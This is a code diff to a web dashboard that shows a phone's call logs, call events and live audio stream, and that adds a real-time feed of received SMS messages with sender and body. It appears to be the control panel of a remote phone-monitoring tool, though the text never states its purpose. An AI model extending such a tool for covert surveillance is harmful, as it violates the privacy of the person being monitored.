@@ -51,8 +51,8 @@
       margin-top: 5px;
       font-style: italic;
     }
-    /* Call logs styling */
-    #callLogsTable {
+    /* Table styling */
+    table {
       width: 100%;
       margin-top: 15px;
       border-collapse: collapse;
@@ -61,20 +61,20 @@
       overflow: hidden;
       box-shadow: 0 2px 6px rgba(0,0,0,0.1);
     }
-    #callLogsTable th, #callLogsTable td {
+    th, td {
       border: 1px solid #ddd;
       padding: 8px;
       text-align: center;
     }
-    #callLogsTable th {
+    th {
       background: #007bff;
       color: #fff;
     }
-    #callLogsTable tr:nth-child(even) {
+    tr:nth-child(even) {
       background: #f9f9f9;
     }
-    /* Real-time call events styling */
-    #callEventsList {
+    /* Event list styling */
+    .eventList {
       margin-top: 15px;
       padding: 10px;
       background: #fff;
@@ -84,12 +84,12 @@
       overflow-y: auto;
       box-shadow: 0 2px 6px rgba(0,0,0,0.1);
     }
-    #callEventsList div {
+    .eventList div {
       margin-bottom: 5px;
       padding: 5px;
       border-bottom: 1px solid #eee;
     }
-    #callEventsList div:last-child {
+    .eventList div:last-child {
       border-bottom: none;
     }
   </style>
@@ -122,10 +122,16 @@
     </tbody>
   </table>
 
-  <!-- Real-time Call Events Section -->
+  <!-- Real-time Call Events -->
   <h2>📞 Real-time Call Events</h2>
-  <div id="callEventsList">
+  <div id="callEventsList" class="eventList">
     <div>Waiting for call events...</div>
+  </div>
+
+  <!-- Real-time SMS Messages -->
+  <h2>📨 Real-time SMS Messages</h2>
+  <div id="smsList" class="eventList">
+    <div>Waiting for SMS messages...</div>
   </div>
 
   <script>
@@ -136,7 +142,6 @@
       statusDiv.innerText = "🟢 Connected to server";
       statusDiv.style.color = "green";
 
-      // Register this dashboard as listener
       socket.emit("listener-register");
       console.log("Listener registered");
     });
@@ -182,7 +187,6 @@
         isPlaying = false;
         return;
       }
-
       const float32Array = audioQueue.shift();
       const audioBuffer = audioContext.createBuffer(1, float32Array.length, 16000);
       audioBuffer.copyToChannel(float32Array, 0);
@@ -197,7 +201,6 @@
 
     socket.on("audio-chunk", (base64Chunk) => {
       if (!audioContext) return;
-
       const byteString = atob(base64Chunk.replace(/\n/g,''));
       const buffer = new Uint8Array(byteString.length);
       for (let i = 0; i < byteString.length; i++) buffer[i] = byteString.charCodeAt(i);
@@ -238,8 +241,17 @@
     socket.on("call-event", (event) => {
       const div = document.createElement("div");
       div.innerText = `[${new Date().toLocaleTimeString()}] ${event.state} - ${event.number || "Unknown"}`;
-      callEventsList.prepend(div); // show latest on top
+      callEventsList.prepend(div);
     });
+
+    // === REAL-TIME SMS MESSAGES ===
+    const smsList = document.getElementById("smsList");
+    socket.on("sms-received", (sms) => {
+      const div = document.createElement("div");
+      div.innerText = `[${new Date().toLocaleTimeString()}] ${sms.sender || "Unknown"}: ${sms.body}`;
+      smsList.prepend(div);
+    });
+
   </script>
 </body>
 </html>
